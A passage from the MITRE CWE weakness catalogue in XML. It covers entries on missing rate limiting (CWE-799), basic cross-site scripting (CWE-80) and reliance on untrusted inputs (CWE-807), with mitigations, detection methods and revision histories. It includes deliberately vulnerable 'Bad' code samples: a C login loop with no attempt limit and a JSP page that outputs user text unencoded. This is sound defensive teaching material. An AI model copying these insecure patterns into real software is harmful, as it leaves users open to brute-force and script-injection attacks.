               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Detection_Factors, Maintenance_Notes, Potential_Mitigations, Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="799" Name="Improper Control of Interaction Frequency" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product does not properly limit the number or frequency of interactions that it has with an actor, such as the number of incoming requests.</Description>
         <Extended_Description>This can allow the actor to perform actions more frequently than expected. The actor could be a human or an automated process such as a virus or bot. This could be used to cause a denial of service, compromise program logic (such as limiting humans to a single vote), or other consequences. For example, an authentication routine might not limit the number of times an attacker can guess a password. Or, a web site might conduct a poll but only expect humans to vote a maximum of once a day.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="691" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Insufficient anti-automation</Term>
               <Description>The term "insufficient anti-automation" focuses primarly on non-human actors such as viruses or bots, but the scope of this CWE entry is broader.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Brute force</Term>
               <Description>Vulnerabilities that can be targeted using brute force attacks are often symptomatic of this weakness.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following code a username and password is read from a socket and an attempt is made to authenticate the username and password. The code will continuously checked the socket for a username and password until it has been authenticated.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char username[USERNAME_SIZE];<xhtml:br/>char password[PASSWORD_SIZE];<xhtml:br/>
                     <xhtml:br/>while (isValidUser == 0) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (getNextMessage(socket, username, USERNAME_SIZE) &gt; 0) {<xhtml:div style="margin-left:1em;">if (getNextMessage(socket, password, PASSWORD_SIZE) &gt; 0) {<xhtml:div style="margin-left:1em;">isValidUser = AuthenticateUser(username, password);</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}<xhtml:br/>return(SUCCESS);</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not place any restriction on the number of authentication attempts made. There should be a limit on the number of authentication attempts made to prevent brute force attacks as in the following example code.</Body_Text>
               <Example_Code Nature="Good" Language="C">
                  <xhtml:div>int count = 0;<xhtml:br/>while ((isValidUser == 0) &amp;&amp; (count &lt; MAX_ATTEMPTS)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (getNextMessage(socket, username, USERNAME_SIZE) &gt; 0) {<xhtml:div style="margin-left:1em;">if (getNextMessage(socket, password, PASSWORD_SIZE) &gt; 0) {<xhtml:div style="margin-left:1em;">isValidUser = AuthenticateUser(username, password);</xhtml:div>}</xhtml:div>}<xhtml:br/>count++;</xhtml:div>
                     </xhtml:div>}<xhtml:br/>if (isValidUser) {<xhtml:div style="margin-left:1em;">return(SUCCESS);</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">return(FAIL);</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-1876</Reference>
               <Description>Mail server allows attackers to prevent other users from accessing mail by sending large number of rapid requests.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1876</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>21</Entry_ID>
               <Entry_Name>Insufficient Anti-Automation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-731"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-01-15</Submission_Date>
               <Submission_Comment>New entry to handle anti-automation as identified in WASC.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="80" Name="Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as "&lt;", "&gt;", and "&amp;" that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.</Description>
         <Extended_Description>This may allow such characters to be treated as control characters, which are executed client-side in the context of the user's session. Although this can be classified as an injection problem, the more pertinent issue is the improper conversion of such special characters to respective context-appropriate entities before displaying them to the user.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="79" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30.1">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</xhtml:p>
                  <xhtml:p>The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-43">
               <Phase>Implementation</Phase>
               <Description>With Struts, write all data from form beans with the bean's filter attribute set to true.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-31">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following example, a guestbook comment isn't properly encoded, filtered, or otherwise neutralized for script-related tags before being displayed in a client browser.</Intro_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>&lt;% for (Iterator i = guestbook.iterator(); i.hasNext(); ) {<xhtml:div style="margin-left:1em;">Entry e = (Entry) i.next(); %&gt;<xhtml:br/>&lt;p&gt;Entry #&lt;%= e.getId() %&gt;&lt;/p&gt;<xhtml:br/>&lt;p&gt;&lt;%= e.getText() %&gt;&lt;/p&gt;<xhtml:br/>&lt;%<xhtml:br/>} %&gt;</xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0938</Reference>
               <Description>XSS in parameter in a link.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0938</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1495</Reference>
               <Description>XSS in web-based email product via attachment filenames.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1495</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1136</Reference>
               <Description>HTML injection in posted message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1136</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2171</Reference>
               <Description>XSS not quoted in error page.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2171</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Basic XSS</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="18"/>
            <Related_Attack_Pattern CAPEC_ID="193"/>
            <Related_Attack_Pattern CAPEC_ID="32"/>
            <Related_Attack_Pattern CAPEC_ID="86"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Relationships, White_Box_Definitions</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Basic XSS</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Script-Related HTML Tags in a Web Page (Basic XSS)</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Script-Related HTML Tags in a Web Page (Basic XSS)</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="807" Name="Reliance on Untrusted Inputs in a Security Decision" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.</Description>
         <Extended_Description>
            <xhtml:p>Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.</xhtml:p>
            <xhtml:p>Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>The effectiveness and speed of manual analysis will be reduced if the there is not a centralized security mechanism, and the security logic is widely distributed throughout the software.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-14">
               <Phase>Architecture and Design</Phase>
